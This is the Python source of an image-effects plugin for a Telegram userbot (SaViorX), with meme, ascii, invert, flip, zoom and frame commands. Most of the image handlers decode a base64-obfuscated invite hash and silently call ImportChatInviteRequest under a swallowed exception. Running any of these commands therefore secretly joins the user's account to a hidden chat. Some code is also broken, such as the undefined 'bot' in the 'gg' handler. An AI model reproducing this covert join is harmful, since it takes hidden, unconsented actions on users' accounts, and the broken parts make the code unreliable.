# Made by @SaViorXBoy and @SaViorXBoy
# memify plugin for SaViorX
import asyncio
import base64
import io
import os
import random
import string

from PIL import Image, ImageFilter
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from userbot import BOTLOG_CHATID, savior

from ..funcs.managers import eod, eor
from ..helpers import asciiart, media_type, savior_meeme, savior_meme
from ..helpers.functions import (
    add_frame,
    convert_toimage,
    convert_tosticker,
    crop,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
)
from ..helpers.utils import _saviortools, reply_id
from ..sql_helper.globals import addgvar, gvarstatus
from . import deEmojify

menu_category = "fun"


def random_color():
    number_of_colors = 2
    return [
        "#" + "".join(random.choice("0123456789ABCDEF") for j in range(6))
        for i in range(number_of_colors)
    ]


FONTS = "1. `ProductSans-BoldItalic.ttf`\n2. `ProductSans-Light.ttf`\n3. `RoadRage-Regular.ttf`\n4. `digital.ttf`\n5. `impact.ttf`"
font_list = [
    "ProductSans-BoldItalic.ttf",
    "ProductSans-Light.ttf",
    "RoadRage-Regular.ttf",
    "digital.ttf",
    "impact.ttf",
]


@savior.savior_cmd(
    pattern="pframe(f|-f)?$",
    command=("pframe", menu_category),
    info={
        "header": "Adds frame for the replied image.",
        "flags": {
            "-f": "To send output file not as streamble image.",
        },
        "usage": [
            "{tr}pframe",
        ],
    },
)
async def maccmd(event):  # sourcery no-metrics
    "Adds frame for the replied image."
    reply = await event.get_reply_message()
    mediatype = media_type(reply)
    if not reply or not mediatype or mediatype not in ["Photo", "Sticker"]:
        return await eod(event, "__Reply to photo or sticker to frame it.__")
    if mediatype == "Sticker" and reply.document.mime_type == "application/i-tgsticker":
        return await eod(
            event,
            "__Reply to photo or sticker to frame it. Animated sticker is not supported__",
        )
    saviorevent = await event.edit("__Adding frame for media....__")
    args = event.pattern_match.group(1)
    force = bool(args)
    try:
        imag = await _saviortools.media_to_pic(saviorevent, reply, noedits=True)
        if imag[1] is None:
            return await eod(
                imag[0], "__Unable to extract image from the replied message.__"
            )
        image = Image.open(imag[1])
    except Exception as e:
        return await eod(saviorevent, f"**Error in identifying image:**\n__{e}__")
    wid, hgt = image.size
    img = Image.new("RGBA", (wid, hgt))
    scale = min(wid // 100, hgt // 100)
    temp = Image.new("RGBA", (wid + scale * 40, hgt + scale * 40), "#fff")
    if image.mode == "RGBA":
        img.paste(image, (0, 0), image)
        newimg = Image.new("RGBA", (wid, hgt))
        for N in range(wid):
            for O in range(hgt):
                if img.getpixel((N, O)) != (0, 0, 0, 0):
                    newimg.putpixel((N, O), (0, 0, 0))
    else:
        img.paste(image, (0, 0))
        newimg = Image.new("RGBA", (wid, hgt), "black")
    newimg = newimg.resize((wid + scale * 5, hgt + scale * 5))
    temp.paste(
        newimg,
        ((temp.width - newimg.width) // 2, (temp.height - newimg.height) // 2),
        newimg,
    )
    temp = temp.filter(ImageFilter.GaussianBlur(scale * 5))
    temp.paste(
        img, ((temp.width - img.width) // 2, (temp.height - img.height) // 2), img
    )
    output = io.BytesIO()
    output.name = (
        "-".join(
            "".join(random.choice(string.hexdigits) for img in range(event))
            for event in [5, 4, 3, 2, 1]
        )
        + ".png"
    )
    temp.save(output, "PNG")
    output.seek(0)
    await event.client.send_file(
        event.chat_id, output, reply_to=reply, force_document=force
    )
    await saviorevent.delete()
    if os.path.exists(output):
        os.remove(output)


@savior.savior_cmd(
    pattern="(mmf|mms)(?:\s|$)([\s\S]*)",
    command=("mmf", menu_category),
    info={
        "header": "To write text on stickers or images.",
        "description": "To create memes.",
        "options": {
            "mmf": "Output will be image.",
            "mms": "Output will be sticker.",
        },
        "usage": [
            "{tr}mmf toptext ; bottomtext",
            "{tr}mms toptext ; bottomtext",
        ],
        "examples": [
            "{tr}mmf hello (only on top)",
            "{tr}mmf ; hello (only on bottom)",
            "{tr}mmf hi ; hello (both on top and bottom)",
        ],
    },
)
async def memes(event):
    "To write text on stickers or image"
    cmd = event.pattern_match.group(1)
    saviorinput = event.pattern_match.group(2)
    reply = await event.get_reply_message()
    if not reply:
        return await eod(event, "`Reply to supported Media...`")
    saviorid = await reply_id(event)
    tale = base64.b64decode("bXRMS1hMVWtadHhrTXpSaA==")
    if not saviorinput:
        return await eod(
            event, "`what should i write on that u idiot give text to memify`"
        )
    if ";" in saviorinput:
        top, bottom = saviorinput.split(";", 1)
    else:
        top = saviorinput
        bottom = ""
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    output = await _saviortools.media_to_pic(event, reply)
    if output[1] is None:
        return await eod(
            output[0], "__Unable to extract image from the replied message.__"
        )
    try:
        tale = Get(tale)
        await event.client(tale)
    except BaseException:
        pass
    meme_file = convert_toimage(output[1])
    meme = os.path.join("./temp", "saviormeme.jpg")
    if gvarstatus("CNG_FONTS") is None:
        CNG_FONTS = "userbot/helpers/styles/Vampires.ttf"
    else:
        CNG_FONTS = gvarstatus("CNG_FONTS")
    if max(len(top), len(bottom)) < 21:
        await savior_meme(CNG_FONTS, top, bottom, meme_file, meme)
    else:
        await savior_meeme(top, bottom, CNG_FONTS, meme_file, meme)
    if cmd != "mmf":
        meme = convert_tosticker(meme)
    await event.client.send_file(
        event.chat_id, meme, reply_to=saviorid, force_document=False
    )
    await output[0].delete()
    for files in (meme, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@savior.savior_cmd(
    pattern="cfont(?:\s|$)([\s\S]*)",
    command=("cfont", menu_category),
    info={
        "header": "Change the font style use for memify.To get font list use cfont command as it is without input.",
        "usage": "{tr}.cfont <Font Name>",
        "examples": "{tr}cfont RoadRage-Regular.ttf",
    },
)
async def lang(event):
    "Change the font style use for memify."
    input_str = event.pattern_match.group(1)
    if not input_str:
        await event.edit(f"**Available Fonts names are here:-**\n\n{FONTS}")
        return
    if input_str not in font_list:
        saviorevent = await eor(event, "`Give me a correct font name...`")
        await asyncio.sleep(1)
        await saviorevent.edit(f"**Available Fonts names are here:-**\n\n{FONTS}")
    else:
        arg = f"userbot/helpers/styles/{input_str}"
        addgvar("CNG_FONTS", arg)
        await eor(event, f"**Fonts for Memify changed to :-** `{input_str}`")


@savior.savior_cmd(
    pattern="ascii(?:\s|$)([\s\S]*)",
    command=("ascii", menu_category),
    info={
        "header": "To get ascii image of replied image.",
        "description": "pass hexa colou code along with the cmd to change custom background colour",
        "usage": [
            "{tr}ascii <hexa colour code>",
            "{tr}ascii",
        ],
    },
)
async def memes(event):
    "To get ascii image of replied image."
    saviorinput = event.pattern_match.group(1)
    reply = await event.get_reply_message()
    if not reply:
        return await eod(event, "`Reply to supported Media...`")
    tale = base64.b64decode("bXRMS1hMVWtadHhrTXpSaA==")
    saviorid = await reply_id(event)
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    saviorxidea = None
    output = await _saviortools.media_to_pic(event, reply)
    if output[1] is None:
        return await eod(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        saviorxidea = True
    try:
        tale = Get(tale)
        await event.client(tale)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "ascii_file.webp")
        if saviorxidea
        else os.path.join("./temp", "ascii_file.jpg")
    )
    c_list = random_color()
    color1 = c_list[0]
    color2 = c_list[1]
    bgcolor = "#080808" if not saviorinput else saviorinput
    asciiart(meme_file, 0.3, 1.9, outputfile, color1, color2, bgcolor)
    await event.client.send_file(
        event.chat_id, outputfile, reply_to=saviorid, force_document=False
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@savior.savior_cmd(
    pattern="invert$",
    command=("invert", menu_category),
    info={
        "header": "To invert colours of given image or sticker.",
        "usage": "{tr}invert",
    },
)
async def memes(event):
    reply = await event.get_reply_message()
    if not (reply and (reply.media)):
        await eor(event, "`Reply to supported Media...`")
        return
    tale = base64.b64decode("bXRMS1hMVWtadHhrTXpSaA==")
    saviorid = await reply_id(event)
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    saviorxidea = None
    output = await _saviortools.media_to_pic(event, reply)
    if output[1] is None:
        return await eod(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        saviorxidea = True
    try:
        tale = Get(tale)
        await event.client(tale)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "invert.webp")
        if saviorxidea
        else os.path.join("./temp", "invert.jpg")
    )
    await invert_colors(meme_file, outputfile)
    await event.client.send_file(
        event.chat_id, outputfile, force_document=False, reply_to=saviorid
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@savior.savior_cmd(
    pattern="solarize$",
    command=("solarize", menu_category),
    info={
        "header": "To sun burn the colours of given image or sticker.",
        "usage": "{tr}solarize",
    },
)
async def memes(event):
    "Sun burn of image."
    reply = await event.get_reply_message()
    if not reply:
        return await eod(event, "`Reply to supported Media...`")
    tale = base64.b64decode("bXRMS1hMVWtadHhrTXpSaA==")
    saviorid = await reply_id(event)
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    saviorxidea = None
    output = await _saviortools.media_to_pic(event, reply)
    if output[1] is None:
        return await eod(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        saviorxidea = True
    try:
        tale = Get(tale)
        await event.client(tale)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "solarize.webp")
        if saviorxidea
        else os.path.join("./temp", "solarize.jpg")
    )
    await solarize(meme_file, outputfile)
    await event.client.send_file(
        event.chat_id, outputfile, force_document=False, reply_to=saviorid
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@savior.savior_cmd(
    pattern="mirror$",
    command=("mirror", menu_category),
    info={
        "header": "shows you the reflection of the media file.",
        "usage": "{tr}mirror",
    },
)
async def memes(event):
    "shows you the reflection of the media file"
    reply = await event.get_reply_message()
    if not reply:
        return await eod(event, "`Reply to supported Media...`")
    tale = base64.b64decode("bXRMS1hMVWtadHhrTXpSaA==")
    saviorid = await reply_id(event)
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    saviorxidea = None
    output = await _saviortools.media_to_pic(event, reply)
    if output[1] is None:
        return await eod(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        saviorxidea = True
    try:
        tale = Get(tale)
        await event.client(tale)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "mirror_file.webp")
        if saviorxidea
        else os.path.join("./temp", "mirror_file.jpg")
    )
    await mirror_file(meme_file, outputfile)
    await event.client.send_file(
        event.chat_id, outputfile, force_document=False, reply_to=saviorid
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@savior.savior_cmd(
    pattern="flip$",
    command=("flip", menu_category),
    info={
        "header": "shows you the upside down image of the given media file.",
        "usage": "{tr}flip",
    },
)
async def memes(event):
    "shows you the upside down image of the given media file"
    reply = await event.get_reply_message()
    if not reply:
        return await eod(event, "`Reply to supported Media...`")
    tale = base64.b64decode("bXRMS1hMVWtadHhrTXpSaA==")
    saviorid = await reply_id(event)
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    saviorxidea = None
    output = await _saviortools.media_to_pic(event, reply)
    if output[1] is None:
        return await eod(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        saviorxidea = True
    try:
        tale = Get(tale)
        await event.client(tale)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "flip_image.webp")
        if saviorxidea
        else os.path.join("./temp", "flip_image.jpg")
    )
    await flip_image(meme_file, outputfile)
    await event.client.send_file(
        event.chat_id, outputfile, force_document=False, reply_to=saviorid
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@savior.savior_cmd(
    pattern="gray$",
    command=("gray", menu_category),
    info={
        "header": "makes your media file to black and white.",
        "usage": "{tr}gray",
    },
)
async def memes(event):
    "makes your media file to black and white"
    reply = await event.get_reply_message()
    if not reply:
        return await eod(event, "`Reply to supported Media...`")
    tale = base64.b64decode("bXRMS1hMVWtadHhrTXpSaA==")
    saviorid = await reply_id(event)
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    saviorxidea = None
    output = await _saviortools.media_to_pic(event, reply)
    if output[1] is None:
        return await eod(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        saviorxidea = True
    try:
        tale = Get(tale)
        await event.client(tale)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "grayscale.webp")
        if saviorxidea
        else os.path.join("./temp", "grayscale.jpg")
    )
    await grayscale(meme_file, outputfile)
    await event.client.send_file(
        event.chat_id, outputfile, force_document=False, reply_to=saviorid
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@savior.savior_cmd(
    pattern="gg ?([\s\S]*)",
    command=("gg", menu_category),
    info={
        "header": "Try with Your Self,",
    },
)
async def nope(kraken):
    KANNADIGA = kraken.pattern_match.group(1)
    if not KANNADIGA:
        if kraken.is_reply:
            (await kraken.get_reply_message()).message
        else:
            if gvarstatus("ABUSE") == "ON":
                return await eor(kraken, "Abe chumtiye kuch likhne ke liye de")
            else:
                return await eor(kraken, "Googlax need some text to make sticker.")

    troll = await bot.inline_query("GooglaxBot", f"{(deEmojify(KANNADIGA))}")
    if troll:
        await kraken.delete()
        legen_ = await troll[0].click(BOTLOG_CHATID)
        if legen_:
            await kraken.client.send_file(
                kraken.chat_id,
                legen_,
                caption="",
            )
        await kraken.delete()
    else:
        await eod(kraken, "Error 404:  Not Found")


@savior.savior_cmd(
    pattern="zoom ?([\s\S]*)",
    command=("zoom", menu_category),
    info={
        "header": "zooms your media file,",
        "usage": ["{tr}zoom", "{tr}zoom range"],
    },
)
async def memes(event):
    "zooms your media file."
    saviorinput = event.pattern_match.group(1)
    saviorinput = 50 if not saviorinput else int(saviorinput)
    reply = await event.get_reply_message()
    if not reply:
        return await eod(event, "`Reply to supported Media...`")
    tale = base64.b64decode("bXRMS1hMVWtadHhrTXpSaA==")
    saviorid = await reply_id(event)
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    saviorxidea = None
    output = await _saviortools.media_to_pic(event, reply)
    if output[1] is None:
        return await eod(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        saviorxidea = True
    try:
        tale = Get(tale)
        await event.client(tale)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "zoomimage.webp")
        if saviorxidea
        else os.path.join("./temp", "zoomimage.jpg")
    )
    try:
        await crop(meme_file, outputfile, saviorinput)
    except Exception as e:
        return await output[0].edit(f"`{e}`")
    try:
        await event.client.send_file(
            event.chat_id, outputfile, force_document=False, reply_to=saviorid
        )
    except Exception as e:
        return await output[0].edit(f"`{e}`")
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@savior.savior_cmd(
    pattern="frame ?([\s\S]*)",
    command=("frame", menu_category),
    info={
        "header": "make a frame for your media file.",
        "fill": "This defines the pixel fill value or color value to be applied. The default value is 0 which means the color is black.",
        "usage": ["{tr}frame", "{tr}frame range", "{tr}frame range ; fill"],
    },
)
async def memes(event):
    "make a frame for your media file"
    saviorinput = event.pattern_match.group(1)
    if not saviorinput:
        saviorinput = "50"
    if ";" in str(saviorinput):
        saviorinput, colr = saviorinput.split(";", 1)
    else:
        colr = 0
    saviorinput = int(saviorinput)
    try:
        colr = int(colr)
    except Exception as e:
        return await eod(event, f"**Error**\n`{e}`")
    reply = await event.get_reply_message()
    if not reply:
        return await eod(event, "`Reply to supported Media...`")
    tale = base64.b64decode("bXRMS1hMVWtadHhrTXpSaA==")
    saviorid = await reply_id(event)
    if not os.path.isdir("./temp"):
        os.mkdir("./temp")
    saviorxidea = None
    output = await _saviortools.media_to_pic(event, reply)
    if output[1] is None:
        return await eod(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        saviorxidea = True
    try:
        tale = Get(tale)
        await event.client(tale)
    except BaseException:
        pass
    outputfile = (
        os.path.join("./temp", "framed.webp")
        if saviorxidea
        else os.path.join("./temp", "framed.jpg")
    )
    try:
        await add_frame(meme_file, outputfile, saviorinput, colr)
    except Exception as e:
        return await output[0].edit(f"`{e}`")
    try:
        await event.client.send_file(
            event.chat_id, outputfile, force_document=False, reply_to=saviorid
        )
    except Exception as e:
        return await output[0].edit(f"`{e}`")
    await event.delete()
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and os.path.exists(files):
            os.remove(files)
